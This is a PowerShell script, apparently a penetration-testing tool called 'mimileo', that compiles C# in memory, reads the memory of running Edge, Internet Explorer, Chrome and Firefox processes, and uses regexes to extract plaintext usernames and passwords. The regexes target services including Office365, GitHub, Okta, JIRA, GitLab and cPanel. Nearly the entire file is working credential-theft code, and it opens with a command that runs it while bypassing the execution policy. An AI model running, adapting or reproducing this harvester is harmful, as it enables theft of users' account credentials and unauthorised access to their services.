# powershell -executionpolicy bypass -file mimileo.ps1
function Invoke-mimileo
{
$Source2 = @"
using System;
using System.Collections.Generic;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.IO;

namespace mimileo
{
    public class MemProcInspector
    {
        static MemProcInspector()
        {
            InitRegexes();
        }


        public static void AddRegex(string name, string pattern)
        {
            regexes.Add(new RegexRecord(name, pattern));
        }

        public static List<RegexRecord> regexes = new List<RegexRecord>();

        public static List<MatchInfo> InspectManyProcs(params string[] procNames)
        {



            List<MatchInfo> lstMatch = new List<MatchInfo>();
            string res = "None";
            foreach (string procName in procNames)
            {
                try
                {

                    Process[] procs = Process.GetProcessesByName(procName);
                    foreach (Process pr in procs)
                    {
                        Process process = pr;

                        res = InspectProc(process, ref lstMatch);

                    }
                }
                catch (Exception ex)
                {
                    res = ex.Message;
                    res = ex.StackTrace;
                }
            }
            List<string> lstToReturn = new List<string>();

            return lstMatch;
        }

        private static void InitRegexes()
        {
            regexes.Clear();
        }



        private static string InspectProc(Process process, ref List<MatchInfo> lstMatch)
        {
            string res = "";
            IntPtr processHandle = MInterop.OpenProcess(MInterop.PROCESS_WM_READ | MInterop.PROCESS_QUERY_INFORMATION, false, process.Id);
            if (processHandle.ToInt64() == 0)
            {
                int err = Marshal.GetLastWin32Error();

            }

            res = SearchProc(processHandle, ref  lstMatch);
            MInterop.CloseHandle(processHandle);
            return res;
        }

        private static string SearchProc(IntPtr processHandle, ref List<MatchInfo> lstMatch)
        {
            string res = "";
            MInterop.SYSTEM_INFO si = new MInterop.SYSTEM_INFO();
            MInterop.GetSystemInfo(out si);

            long createdSize = 1;
            byte[] lpBuffer = new byte[createdSize];

            Int64 total = 0;

            long regionStart = si.minimumApplicationAddress.ToInt64(); //(BYTE*)si.lpMinimumApplicationAddress;
            bool skipRegion = false;
            bool stop = false;
            while (regionStart < si.maximumApplicationAddress.ToInt64() && !stop)
            {
                MInterop.MEMORY_BASIC_INFORMATION memInfo;

                long regionRead = 0;
                long regionSize;
                int resulq = MInterop.VirtualQueryEx(processHandle, (IntPtr)regionStart, out memInfo, (uint)Marshal.SizeOf(typeof(MInterop.MEMORY_BASIC_INFORMATION)));
                if (resulq == 0)
                {
                    int err = Marshal.GetLastWin32Error();
                    Marshal.ThrowExceptionForHR(err);
                    break;
                }
                regionSize = (memInfo.BaseAddress.ToInt64() + memInfo.RegionSize.ToInt64() - regionStart);
                if (MInterop.IsDataRegion(memInfo) == false)
                {

                }
                if (skipRegion)
                {
                    skipRegion = false;
                }
                else
                    if (MInterop.IsDataRegion(memInfo))
                    {

                        if (createdSize < regionSize)
                        {
                            createdSize = regionSize;
                            lpBuffer = new byte[createdSize];
                        }
                        bool resRead = false;
                        try
                        {
                            resRead = MInterop.ReadProcessMemory(processHandle, new IntPtr(regionStart), lpBuffer, regionSize, out regionRead);
                        }
                        catch //(AccessViolationException ex)
                        {
                            resRead = false;
                        }
                        //  result |= SearchRegion(process, regionStart, regionSize, regexData, regionRead, buffer);
                        regionSize = (int)regionRead;
                        if (!resRead)
                        {
                            // looks like the memory state has been altered by the target process
                            // between our VirtualQueryEx and ReadProcessMemory calls ->
                            // learn the size of the changed region and jump over it on the next iteration
                            skipRegion = true;
                        }
                        if (resRead)
                        {
                            List<string> strsTolook = new List<string>();
                            string str1 = UnicodeEncoding.Unicode.GetString(lpBuffer, 0, (int)regionRead);
                            string str11 = UnicodeEncoding.Unicode.GetString(lpBuffer, 0 + 1, (int)regionRead - 1);
                            string str4 = UnicodeEncoding.ASCII.GetString(lpBuffer, 0, (int)regionRead);
                            strsTolook.Add(str1);
                            strsTolook.Add(str4);
                            strsTolook.Add(str11);

                            foreach (RegexRecord regexRec in regexes)
                            {

                                foreach (string str in strsTolook)
                                {
                                    MatchCollection matches3 = regexRec.Regex.Matches(str);
                                    if (matches3.Count > 0)
                                    {
                                        for (int i = 0; i < matches3.Count; i++)
                                            if (matches3[i].Success && IsMatchesContain(lstMatch, matches3[i].Value) == false && IsRegexRecordsContain(matches3[i].Value) == false)
                                            {
                                                MatchInfo m = new MatchInfo();
                                                m.PatternName = regexRec.Name;
                                                m.PatternMatch = matches3[i].Value;

                                                lstMatch.Add(m);
                                            }
                                        res = matches3[0].Value;


                                    }
                                }
                            }


                        }

                        total += regionSize;
                    }
                regionStart += regionSize;
            }
            return res;
        }

        private static bool IsMatchesContain(List<MatchInfo> matches, string val)
        {
            foreach (MatchInfo item in matches)
            {
                if (string.Compare(item.PatternMatch, val) == 0)
                    return true;
            }
            return false;
        }

        private static bool IsRegexRecordsContain(string pattern)
        {
            foreach (RegexRecord item in regexes)
            {
                if (string.Compare(item.Pattern, pattern) == 0)
                    return true;
            }
            return false;
        }


        const int MAX_PREFIX_LENGTH = 1;
        // the essence
        // estimated upper limit to allocate enough buffers
        const int MAX_MATCH_LENGTH = 1024;

        // the buffer should be large enough to contain at least MAX_CHECK_LENGTH*sizeof(wchar_t) bytes
        const int DEFAULT_SEARCH_BUFFER_SIZE = (10 * 1024 * 1024);
        // the upper limit of the buffer size
        const int MAX_SEARCH_BUFFER_SIZE = (25 * 1024 * 1024);


    }

    public class MatchInfo
    {
        public string PatternName;
        public string PatternMatch;
    }
    public class RegexRecord
    {
        Regex mRegex;

        protected RegexRecord()
        {

        }

        public RegexRecord(string name, string pattern)
        {
            Name = name;
            Pattern = pattern;
            mRegex = new Regex(pattern);
        }

        public Regex Regex { get { return mRegex; } }



        public string Name;


        public string Pattern;



    }

    public class MInterop
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadProcessMemory(IntPtr hProcess,
          IntPtr lpBaseAddress, byte[] lpBuffer, long dwSize, out long lpNumberOfBytesRead);

        public const int PROCESS_WM_READ = 0x0010;
        public const int PROCESS_QUERY_INFORMATION = 0x00000400;

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);

        [StructLayout(LayoutKind.Sequential)]
        public struct MEMORY_BASIC_INFORMATION32
        {
            public IntPtr BaseAddress;
            public IntPtr AllocationBase;
            public uint AllocationProtect;
            public IntPtr RegionSize;
            public uint State;
            public uint Protect;
            public uint Type;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct MEMORY_BASIC_INFORMATION
        {
            public IntPtr BaseAddress;
            public IntPtr AllocationBase;
            public uint AllocationProtect;
            public short aligment;
            public IntPtr RegionSize;
            public uint State;
            public uint Protect;
            public uint Type;
            public short aligment2;
        }

        public enum AllocationProtect : uint
        {
            PAGE_EXECUTE = 0x00000010,
            PAGE_EXECUTE_READ = 0x00000020,
            PAGE_EXECUTE_READWRITE = 0x00000040,
            PAGE_EXECUTE_WRITECOPY = 0x00000080,
            PAGE_NOACCESS = 0x00000001,
            PAGE_READONLY = 0x00000002,
            PAGE_READWRITE = 0x00000004,
            PAGE_WRITECOPY = 0x00000008,
            PAGE_GUARD = 0x00000100,
            PAGE_NOCACHE = 0x00000200,
            PAGE_WRITECOMBINE = 0x00000400
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SYSTEM_INFO
        {
            public ushort processorArchitecture;
            ushort reserved;
            public uint pageSize;
            public IntPtr minimumApplicationAddress;
            public IntPtr maximumApplicationAddress;
            public IntPtr activeProcessorMask;
            public uint numberOfProcessors;
            public uint processorType;
            public uint allocationGranularity;
            public ushort processorLevel;
            public ushort processorRevision;
        }

        [DllImport("kernel32.dll")]
        public static extern void GetSystemInfo(out SYSTEM_INFO lpSystemInfo);

        public enum StateEnum : uint
        {
            MEM_COMMIT = 0x1000,
            MEM_FREE = 0x10000,
            MEM_RESERVE = 0x2000
        }

        public enum TypeEnum : uint
        {
            MEM_IMAGE = 0x1000000,
            MEM_MAPPED = 0x40000,
            MEM_PRIVATE = 0x20000
        }

        internal static bool IsDataRegion(MEMORY_BASIC_INFORMATION memInfo)
        {

            bool res =    // check this is a live (not free/reserved) memory
            (memInfo.State & (uint)StateEnum.MEM_COMMIT) != 0 &&
                // don't examine memory mapped files sections / PE images
                //  (memInfo.Type & (uint)TypeEnum.MEM_PRIVATE) != 0 &&
                // don't read PAGE_GUARD memory to avoid altering target state
            (memInfo.Protect & ((uint)AllocationProtect.PAGE_NOACCESS | (uint)AllocationProtect.PAGE_GUARD)) == 0
            &&
                // make sure the memory is readable
            (memInfo.Protect & ((uint)AllocationProtect.PAGE_READONLY | (uint)AllocationProtect.PAGE_READWRITE |
            (uint)AllocationProtect.PAGE_EXECUTE_READ | (uint)AllocationProtect.PAGE_EXECUTE_READWRITE | (uint)AllocationProtect.PAGE_EXECUTE_WRITECOPY)) != 0;

            return res;
        }

        public enum ProcessAccessTypes
        {
            PROCESS_TERMINATE = 0x00000001,
            PROCESS_CREATE_THREAD = 0x00000002,
            PROCESS_SET_SESSIONID = 0x00000004,
            PROCESS_VM_OPERATION = 0x00000008,
            PROCESS_VM_READ = 0x00000010,
            PROCESS_VM_WRITE = 0x00000020,
            PROCESS_DUP_HANDLE = 0x00000040,
            PROCESS_CREATE_PROCESS = 0x00000080,
            PROCESS_SET_QUOTA = 0x00000100,
            PROCESS_SET_INFORMATION = 0x00000200,
            PROCESS_QUERY_INFORMATION = 0x00000400,
            STANDARD_RIGHTS_REQUIRED = 0x000F0000,
            SYNCHRONIZE = 0x00100000,
            PROCESS_ALL_ACCESS = PROCESS_TERMINATE | PROCESS_CREATE_THREAD | PROCESS_SET_SESSIONID | PROCESS_VM_OPERATION |
              PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_DUP_HANDLE | PROCESS_CREATE_PROCESS | PROCESS_SET_QUOTA |
              PROCESS_SET_INFORMATION | PROCESS_QUERY_INFORMATION | STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE
        }
    }
}


"@

$inmem=New-Object -TypeName System.CodeDom.Compiler.CompilerParameters
$inmem.GenerateInMemory=1
$inmem.ReferencedAssemblies.AddRange($(@("System.dll", $([PSObject].Assembly.Location))))

Add-Type -TypeDefinition $Source2 -Language CSharp -CompilerParameters $inmem

[mimileo.MemProcInspector]::regexes.Clear()
    #Dropbox
    [mimileo.MemProcInspector]::AddRegex("Dropbox","login_email=.{1,99}&login_password=.{1,99}&")
    #Microsoft suite now use SSO, all use the same regexp
    [mimileo.MemProcInspector]::AddRegex("Office365 or drive","login=.{1,200}&passwd=.{1,22}&")
    #CitrixOnline
    [mimileo.MemProcInspector]::AddRegex("logmeininc.com","emailAddress=.{1,50}&password=.{1,50}&submit")

#Accounting - Removed as sensible for pentest perspective
#Anti-Forensics
    #Malwr - down
    #VirusTotal
    [mimileo.MemProcInspector]::AddRegex("VirusTotal",'{"user_id":".{1,42}","password":".{1,22}",')
    #AnubisLabs - dunno

#Remote Access

    #Citrix NetScaler - Can't found
    #[mimileo.MemProcInspector]::AddRegex("CitrixNetScaler","login=.{1,22}&passwd=.{1,42}")
    #Remote Desktop Web Access 2012 - need to be deployed and tested
    #[mimileo.MemProcInspector]::AddRegex("RDPWeb","DomainUserName=.{1,52}&UserPass=.{1,42}&MachineType")

#Dev Related
    #Jira 7.x / 8.x
    [mimileo.MemProcInspector]::AddRegex("JIRA","os_username=.{1,50}&os_password=.{1,50}&")
    #Redmine
    [mimileo.MemProcInspector]::AddRegex("Redmine","username=.{1,50}&password=.{1,50}&login=")
    #Github
    [mimileo.MemProcInspector]::AddRegex("Github","&login=.{1,50}&password=.{1,50}&")
    #Bugzilla 
    [mimileo.MemProcInspector]::AddRegex("BugZilla","Bugzilla_login=.{1,50}&Bugzilla_password=.{1,50}")
    #Zendesk - a verifier
    #[mimileo.MemProcInspector]::AddRegex("Zendesk","user%5Bemail%5D=.{1,50}&user%5Bpassword%5D=.{1,50}")
    #Cpanel
    [mimileo.MemProcInspector]::AddRegex("Cpanel","user=.{1,50}&pass=.{1,50}")
    [mimileo.MemProcInspector]::AddRegex("Cpanel","email=.{1,50}&password=.{1,50}")

    # Service now ? (not SSO)
    [mimileo.MemProcInspector]::AddRegex("Service Now","user_name=.{1,50}&user_password=.{1,50}&")
    #okta
    [mimileo.MemProcInspector]::AddRegex("OKTA",'{"password":".{1,50}","username":".{1,50}",')
    

    [mimileo.MemProcInspector]::AddRegex("GitLab","user%5Blogin%5D.{1,50}&user%5Bpassword%5D.{1,50}&")

    $matchesFound=[mimileo.MemProcInspector]::InspectManyProcs("MicrosoftEdgeCP","iexplore","chrome","firefox")

write-output $matchesFound
}